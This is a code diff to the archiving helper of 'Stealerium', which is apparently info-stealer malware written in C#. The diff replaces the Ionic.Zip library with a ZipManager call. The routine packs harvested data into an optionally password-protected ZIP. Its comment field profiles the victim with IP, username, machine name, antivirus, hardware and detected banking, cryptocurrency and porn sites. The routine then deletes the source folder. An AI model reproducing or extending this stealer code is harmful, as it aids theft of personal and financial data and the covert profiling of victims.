@@ -1,9 +1,5 @@
-﻿using System;
-using System.IO;
+﻿using System.IO;
 using System.Linq;
-using System.Text;
-using Ionic.Zip;
-using Ionic.Zlib;
 using Stealerium.Modules.Implant;
 using Stealerium.Target.System;
 
@@ -87,7 +83,7 @@ namespace Stealerium.Helpers
         }
 
         /// <summary>
-        /// Creates a compressed archive (ZIP) of a specified directory.
+        /// Creates a compressed archive (ZIP) of a specified directory using ZipManager.
         /// Optionally sets a password on the archive.
         /// </summary>
         /// <param name="directory">The directory to compress into an archive.</param>
@@ -100,57 +96,47 @@ namespace Stealerium.Helpers
                 throw new DirectoryNotFoundException($"The directory '{directory}' does not exist.");
             }
 
-            // Create the ZIP file with best compression level
-            using (var zip = new ZipFile(Encoding.UTF8))
-            {
-                zip.CompressionLevel = CompressionLevel.BestCompression;
+            // Prepare the ZIP archive path
+            var zipPath = directory + ".zip";
 
-                // Add system and hardware information in the comment section
-                zip.Comment = "" +
-                              $"\nStealerium {Config.Version} - coded by @kgnfth with Love <3" +
-                              "\n" +
-                              "\n== System Info ==" +
-                              $"\nIP: {SystemInfo.GetPublicIpAsync()}" +
-                              $"\nDate: {SystemInfo.Datenow}" +
-                              $"\nUsername: {SystemInfo.Username}" +
-                              $"\nCompName: {SystemInfo.Compname}" +
-                              $"\nLanguage: {SystemInfo.Culture}" +
-                              $"\nAntivirus: {SystemInfo.GetAntivirus()}" +
-                              "\n" +
-                              "\n== Hardware ==" +
-                              $"\nCPU: {SystemInfo.GetCpuName()}" +
-                              $"\nGPU: {SystemInfo.GetGpuName()}" +
-                              $"\nRAM: {SystemInfo.GetRamAmount()}" +
-                              $"\nPower: {SystemInfo.GetBattery()}" +
-                              $"\nScreen: {SystemInfo.ScreenMetrics()}" +
-                              "\n" +
-                              "\n== Domains ==" +
-                              Counter.GetLValue("Banking services", Counter.DetectedBankingServices, '-') +
-                              Counter.GetLValue("Cryptocurrency services", Counter.DetectedCryptoServices, '-') +
-                              Counter.GetLValue("Porn websites", Counter.DetectedPornServices, '-') +
-                              "\n";
+            // Prepare the ZIP comment with system and hardware information
+            string zipComment = "" +
+                                $"\nStealerium {Config.Version} - coded by @kgnfth with Love <3" +
+                                "\n" +
+                                "\n== System Info ==" +
+                                $"\nIP: {SystemInfo.GetPublicIpAsync()}" +
+                                $"\nDate: {SystemInfo.Datenow}" +
+                                $"\nUsername: {SystemInfo.Username}" +
+                                $"\nCompName: {SystemInfo.Compname}" +
+                                $"\nLanguage: {SystemInfo.Culture}" +
+                                $"\nAntivirus: {SystemInfo.GetAntivirus()}" +
+                                "\n" +
+                                "\n== Hardware ==" +
+                                $"\nCPU: {SystemInfo.GetCpuName()}" +
+                                $"\nGPU: {SystemInfo.GetGpuName()}" +
+                                $"\nRAM: {SystemInfo.GetRamAmount()}" +
+                                $"\nPower: {SystemInfo.GetBattery()}" +
+                                $"\nScreen: {SystemInfo.ScreenMetrics()}" +
+                                "\n" +
+                                "\n== Domains ==" +
+                                Counter.GetLValue("Banking services", Counter.DetectedBankingServices, '-') +
+                                Counter.GetLValue("Cryptocurrency services", Counter.DetectedCryptoServices, '-') +
+                                Counter.GetLValue("Porn websites", Counter.DetectedPornServices, '-') +
+                                "\n";
 
-                // Set the password if needed
-                if (setPassword)
-                {
-                    zip.Password = StringsCrypt.ArchivePassword;
-                }
+            // Set the password if needed
+            string password = setPassword ? StringsCrypt.ArchivePassword : null;
 
-                // Add the directory to the ZIP archive
-                zip.AddDirectory(directory);
+            // Create the ZIP archive using ZipManager
+            ZipManager.CreatePasswordProtectedZip(directory, zipPath, password, zipComment);
 
-                // Save the ZIP archive
-                var zipPath = directory + ".zip";
-                zip.Save(zipPath);
+            // Recursively delete the original directory
+            RecursiveDelete(directory);
 
-                // Recursively delete the original directory
-                RecursiveDelete(directory);
+            // Log the completion of the compression
+            Logging.Log($"Archive '{new DirectoryInfo(directory).Name}' compression completed");
 
-                // Log the completion of the compression
-                Logging.Log($"Archive '{new DirectoryInfo(directory).Name}' compression completed");
-
-                return zipPath;
-            }
+            return zipPath;
         }
     }
 }
